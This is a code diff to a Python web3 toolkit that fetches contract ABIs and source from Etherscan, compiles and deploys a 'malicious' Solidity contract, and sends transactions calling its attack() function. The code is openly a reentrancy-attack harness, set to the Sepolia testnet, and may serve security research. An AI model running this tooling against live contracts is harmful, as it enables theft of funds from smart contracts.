@@ -21,7 +21,7 @@ def call_function(w3, contract_address, abi, function_name, *args, from_address=
     result = function(*args).call(call_params)
     return result
 
-def send_transaction(w3, private_key, contract_address, abi, function_name, *args, value=0, gas_price=None):
+def send_transaction(w3: Web3, private_key, contract_address, abi, function_name, value=0, gas_price=None, function_args=[]):
     account = w3.eth.account.from_key(private_key)
     contract = w3.eth.contract(address=Web3.to_checksum_address(contract_address), abi=abi)
     function = getattr(contract.functions, function_name)
@@ -34,7 +34,7 @@ def send_transaction(w3, private_key, contract_address, abi, function_name, *arg
     nonce = w3.eth.get_transaction_count(account.address)
 
     # Build the transaction
-    txn = function(*args).build_transaction({
+    txn = function(*function_args).build_transaction({
         'from': account.address,
         'value': value,  # Sending ether if needed (0 by default)
         'gas': 2000000,
@@ -234,13 +234,13 @@ def deploy_malicious_contract(w3: Web3, private_key: str, bytecode: str, abi: li
         return None
 
     
-def compile_solidity_contract(source_code: str):
+def compile_solidity_contract(source_code: str, contract_name: str):
     """
     Compiles a Solidity contract and returns its bytecode and ABI.
     
     Parameters:
         source_code (str): Solidity source code of the contract.
-
+        contract_name (str): The name of the contract to compile.
     Returns:
         dict: A dictionary containing the compiled bytecode and ABI.
     """
@@ -265,8 +265,8 @@ def compile_solidity_contract(source_code: str):
             }
         })
         
-        bytecode = compiled_sol['contracts']['Contract.sol']['Malicious']['evm']['bytecode']['object']
-        abi = compiled_sol['contracts']['Contract.sol']['Malicious']['abi']
+        bytecode = compiled_sol['contracts']['Contract.sol'][contract_name]['evm']['bytecode']['object']
+        abi = compiled_sol['contracts']['Contract.sol'][contract_name]['abi']
         return {
             "bytecode": bytecode,
             "abi": abi
@@ -288,57 +288,59 @@ def trigger_reentrancy_attack(w3: Web3, private_key: str, contract_abi: list, co
     Returns:
         str: Transaction hash of the attack transaction.
     """
-    try:
-        account = w3.eth.account.from_key(private_key)
-        contract = w3.eth.contract(address=Web3.to_checksum_address(contract_address), abi=contract_abi)
+    account = w3.eth.account.from_key(private_key)
+    contract = w3.eth.contract(address=Web3.to_checksum_address(contract_address), abi=contract_abi)
 
-        # Call the attack function from the malicious contract
-        tx = contract.functions.attack().build_transaction({
-            'chainId': 11155111,  # Sepolia chain ID
-            'from': account.address,
-            'nonce': w3.eth.get_transaction_count(account.address),
-            'gas': 2000000,
-            'gasPrice': w3.eth.gas_price
-        })
+    # Call the attack function from the malicious contract
+    tx = contract.functions.attack().build_transaction({
+        'chainId': 11155111,  # Sepolia chain ID
+        'from': account.address,
+        'nonce': w3.eth.get_transaction_count(account.address),
+        'gas': 2000000,
+        'gasPrice': w3.eth.gas_price
+    })
+    signed_tx = w3.eth.account.sign_transaction(tx, private_key)
+    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
+    return tx_hash.hex()
 
-        # Sign and send the transaction
-        signed_tx = w3.eth.account.sign_transaction(tx, private_key)
-        tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
-
-        return tx_hash.hex()
-    except Exception as e:
-        print(f"Error in triggering reentrancy attack: {e}")
-        return None
-
-def get_abi_and_source_code_etherscan(address: str):
+def get_abi_from_etherscan(address: str):
     """
-    Fetches the ABI and source code of a contract from Etherscan.
+    Fetches the ABI of a contract from Etherscan.
 
     Parameters:
         address (str): The address of the contract to fetch.
 
     Returns:
-        tuple: A tuple containing the source code and the ABI.
+        list: The parsed ABI of the contract.
     """
-    # Fetch the contract ABI from Etherscan
     abi_response = requests.get(f"{ETHERSCAN_BASE_URL}?module=contract&action=getabi&address={address}&apikey={ETHERSCAN_API_KEY}")
     abi_data = abi_response.json()
 
     if abi_data.get("status") != "1":
-        raise Exception("Unable to fetch ABI")
+        raise Exception(f"Unable to fetch ABI: {abi_data.get('result')}")
 
-    # Parse the ABI JSON string into a Python list
     try:
         abi_parsed = json.loads(abi_data.get("result"))
     except json.JSONDecodeError:
-        raise Exception("Failed to parse ABI")
+        raise Exception(f"Failed to parse ABI: {abi_data.get('result')}")
 
-    # Fetch the contract source code from Etherscan
+    return abi_parsed
+
+def get_source_code_from_etherscan(address: str):
+    """
+    Fetches the source code of a contract from Etherscan.
+
+    Parameters:
+        address (str): The address of the contract to fetch.
+
+    Returns:
+        str: The source code of the contract.
+    """
     sourcecode_response = requests.get(f"{ETHERSCAN_BASE_URL}?module=contract&action=getsourcecode&address={address}&apikey={ETHERSCAN_API_KEY}")
     sourcecode_data = sourcecode_response.json()
 
     if sourcecode_data.get("status") != "1":
-        raise Exception("Unable to fetch source code")
+        raise Exception(f"Unable to fetch source code: {sourcecode_data.get('result')}")
 
     source_code_result = sourcecode_data.get("result", [{}])[0].get("SourceCode", "")
-    return source_code_result, abi_parsed
+    return source_code_result
